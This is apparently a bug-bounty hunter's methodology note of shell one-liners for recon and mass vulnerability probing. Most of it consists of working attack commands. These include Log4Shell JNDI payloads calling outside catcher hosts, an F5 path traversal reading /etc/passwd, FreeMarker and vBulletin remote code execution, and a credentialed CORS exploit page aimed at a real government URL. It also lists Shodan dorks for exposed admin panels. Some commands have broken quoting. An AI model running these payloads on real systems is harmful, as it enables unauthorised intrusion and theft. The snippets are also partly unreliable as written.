---
title: 9-Live Hosts Enumeration
draft: false
tags:
  - gf
---
## P4 Bugs

	https://icecream23.medium.com/some-easiest-p4-bugs-561cd710a7e1

## Web Cache Poisoning

Paraminer -> Cache poison

	https://github.com/xhzeem/toxicache


## HTML Injection

```
"><h1>jadu0x0
```

## Nuclei

```
nuclei -list live-subs.txt -t /root/nuclei-templates/vulnerabilities -t /root/nuclei-templates/cves -t /root/nuclei-templates/exposures -t /root/nuclei-templates/sqli.yaml
```

## Broken Link Scanner

### broken-link-checker


broken-link-checker will crawl a target and look for broken links. Whenever I use this tool I like to run:

```shell
$ blc -rof --filter-level 3 https://example.com/
```

After a while I often find myself adapting it to something like this in order to prevent false positives:

```shell
$ blc -rfoi --exclude linkedin.com --exclude youtube.com --filter-level 3 https://example.com/
```

Link: [https://github.com/stevenvachon/broken-link-checker](https://github.com/stevenvachon/broken-link-checker)

## ParamSpider



```shell
cat ~/$projectname/urls/urls.txt | while IFS="" read -r p || [ -n "$p" ] 
do 
	python3 ~/ParamSpider/paramspider.py --domain "$p" --exclude woff,png,svg,php,jpg --output ~/$projectname/params/$(echo $p | sed 's/https:\/\///g ; s/http:\/\///g').txt 
done && cat ~/$projectname/params/* > ~/$projectname/params/all.txt
```
## 403 Login Pages

```
cat infi_live.txt | ~/go/bin/httpx -path /login -p 80,443,8080,8443 -mc 401,403 -silent -t 300 | ~/go/bin/unfurl format %s://%d | ~/go/bin/httpx -path //login -mc 200 -t 300 -nc -silent
```

## 403 

```
cat status_codes.txt| grep " - 403" | awk '{print $1}' > 403-subdomains.txt
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/bbh/methodology/Pasted%20image%2020241101201823.png)

Always fuzz for interesting endpoints on 403. 

### 403 Bypass


```
while IFS= read -r subdomain; do { echo "Processing: $subdomain" >> process.log; ./bypass-403.sh "$subdomain" >> process.log 2>&1; echo "Done: $subdomain" >> process.log; }; done < /home/carabiner1/Documents/bbh/who/subs/403-subdomains.txt
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/bbh/methodology/Pasted%20image%2020241101203216.png)

Also change request methods 
## Subdomain Takeover

Subzy :-  [https://github.com/LukaSikic/subzy](https://github.com/LukaSikic/subzy)

- subzy run --targets live-subs.txt

```
nuclei -t /root/nuclei-templates/takeovers/ -l live-subs.txt
```

```
cat subs.txt | xargs  -P 50 -I % bash -c "dig % | grep CNAME" | awk '{print $1}' | sed 's/.$//g' | httpx -silent -status-code -cdn -csp-probe -tls-probe
```

```shell
takeover -l ~/$projectname/subdomains/subdomains.txt -v -t 10
```


## CORS

> CORS, or Cross-Origin Resource Sharing, is a security feature implemented by web browsers to prevent unauthorized access to resources (like data or scripts) on a web page from a different **origin (domain)**. It allows servers to specify who can access their resources, thereby protecting sensitive information and preventing malicious attacks like **Cross-Site Request Forgery (CSRF)**.

```
gau "http://target.com" | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done
```

```
<!DOCTYPE html>
<html>
   <head>
      <script>
         function cors() {
	        var xhttp = new XMLHttpRequest();
		        xhttp.onreadystatechange = function() {
			        if (this.readyState == 4 && this.status == 200) {
			        	document.getElementById("emo").innerHTML = alert(this.responseText);
	        }
         };
         xhttp.open("GET", "https://www.safetyreporting.fda.gov/SRP2/en/Home.aspx", true);
         xhttp.withCredentials = true;
         xhttp.send();
         }
      </script>
   </head>
   <body>
      <center>
      <h2>CORS PoC Exploit </h2>
      <h3>created by <a href="https://twitter.com/Jarvis7717">@Jarvis</a></h3>
      <h3>Show full content of page</h3>
      <div id="demo">
         <button type="button" onclick="cors()">Exploit</button>
      </div>
   </body>
</html>
```

### CRSN

```
crsn -f live.txt -t 100 --filter
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/bbh/methodology/Pasted%20image%2020241111185617.png)

---
## Prototpye Pollution

```
subfinder -d target.com -all -silent | httpx -silent -threads 300 | anew -q alive.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' alive.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
```

```
sed 's/$/\/?__proto__[testparam]=exploit\//' live_withings.txt | ~/go/bin/page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
```


------
## CVEs

### CVE-2020-5902:
```
shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done
```
### CVE-2020-3452:
```
while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < domain_list.txt
```
### CVE-2021-44228:
```
cat subdomains.txt | while read host do; do curl -sk --insecure --path-as-is "$host/?test=${jndi:ldap://log4j.requestcatcher.com/a}" -H "X-Api-Version: ${jndi:ldap://log4j.requestcatcher.com/a}" -H "User-Agent: ${jndi:ldap://log4j.requestcatcher.com/a}";done
```
```
cat urls.txt | sed `s/https:///` | xargs -I {} echo `{}/${jndi:ldap://{}attacker.burpcollab.net}` >> lo4j.txt
```
### CVE-2022-0378:
```
cat URLS.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done
```
### CVE-2022-22954:
```
cat urls.txt | while read h do ; do curl -sk --path-as-is “$h/catalog-portal/ui/oauth/verify?error=&deviceUdid=${"freemarker.template.utility.Execute"?new()("cat /etc/hosts")}”| grep "context" && echo "$h\033[0;31mV\n"|| echo "$h \033[0;32mN\n";done
```
### CVE-2022-41040:
```
ffuf -w "urls.txt:URL" -u "https://URL/autodiscover/autodiscover.json?@URL/&Email=autodiscover/autodiscover.json%3f@URL" -mr "IIS Web Core" -r
```

## RCE:
```
cat targets.txt | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -nc -ports 80,443,8080,8443 -mr "uid=" -silent 
```
### vBulletin 5.6.2
```
shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl -s http://$host/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' | grep -q phpinfo && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done;
```
```
subfinder -d target.com | httpx | gau | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt; ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
```


## HeartBleed
```
cat urls.txt | while read line ; do echo "QUIT" | openssl s_client -connect $line:443 2>&1 | grep 'server extension "heartbeat" (id=15)' || echo $line; safe; done
```


```shell
cat ~/$projectname/subdomains/subdomains.txt | while read line ; do echo "QUIT" | openssl s_client -connect $line:443 2>&1 | grep 'server extension "heartbeat" (id=15)' || echo $line: safe; done
```


## Log4Shell

## Log4J

f`cat alive.txt | xargs -I@ sh -c 'python3 /path/to/log4j-scan.py -u @"`



## Hidden Parameter

This command is a sequence of commands using pipes, designed to extract unique form parameters (specifically, hidden form fields) from a list of live URLs and save them to a file. Here's a breakdown of each part:

```
cat alive.txt |rush curl -skl “{}” |grep “type\=\”hidden\”” |grep -Eo “name\=\”[^\”]+\”” |cut -d”\”” -f2 | sort -u’ | anew params.txt
```

## JS Secret Finder

This command is a sequence of commands that leverage multiple tools to scrape for secrets (such as API keys, credentials, or other sensitive information) from a list of URLs. Here's a breakdown of each component of the command:

```
cat alive.txt | rush 'hakrawler -plain -js -depth 2 -url {}' | rush 'python3 /root/Tools/SecretFinder/SecretFinder.py -i {} -o cli' | anew secretfinder
```

```bash
cat js.txt | while read url; do python3 SecretFinder.py -i $url -o cli >> secrets.txt; done
```

or

```bash
katana -u https://test.com -jc -d 2 | grep ".js$" | uniq | sort > js.txt
```



Or

```
echo target.com | gau | grep ".js" | httpx -content-type | grep 'application/javascript'" | awk '{print $1}' | nuclei -t /root/nuclei-templates/exposures/ -silent > secrets.txt
```

or

```
cat ~/js.txt | while read url; do python3 SecretFinder.py -i $url -o cli; done | tee secret_tee.txt
```
## Shodan Dorking :-

[](https://github.com/WadQamar10/My-Hunting-Methodology-/blob/main/My%20Bug%20Hunting%20Methodology.md#shodan-dorking--)

- ssl.cert.subject.CN:"gevme.com*" 200
    
- ssl.cert.subject.CN:"*.target.com" "230 login successful" port:"21"
    
- ssl.cert.subject.CN:"*.target.com"+200 http.title:"Admin"
    
- Set-Cookie:"mongo-express=" "200 OK"
    
- ssl:"invisionapp.com" http.title:"index of / "
    
- ssl:"arubanetworks.com" 200 http.title:"dashboard"
    
- net:192.168.43/24, 192.168.40/24
    
- AEM Login panel :-  git clone [https://github.com/0ang3el/aem-hacker.git](https://github.com/0ang3el/aem-hacker.git)
    

User:anonymous Pass:anonymous
## Collect all interisting ips from Shodan and save them in ips.txt

[](https://github.com/WadQamar10/My-Hunting-Methodology-/blob/main/My%20Bug%20Hunting%20Methodology.md#collect-all-interisting-ips-from-shodan-and-save-them-in-ipstxt)

- cat ips.txt | httpx > live-ips.txt
    
- cat live_ips.txt | dirsearch --stdin
## SNS

### IIS

Directory bruteforce

IIS Shortname Enumeration


#### Short Name Scanner

https://github.com/sw33tLie/sns

```
┌──(carabiner1㉿carabiner)-[~]
└─$ export GOPROXY=https://goproxy.io
                                                                                                                        
┌──(carabiner1㉿carabiner)-[~]
└─$ /usr/local/go/bin/go install github.com/sw33tLie/sns@latest
```


Found notebook, aspnet_client, mission




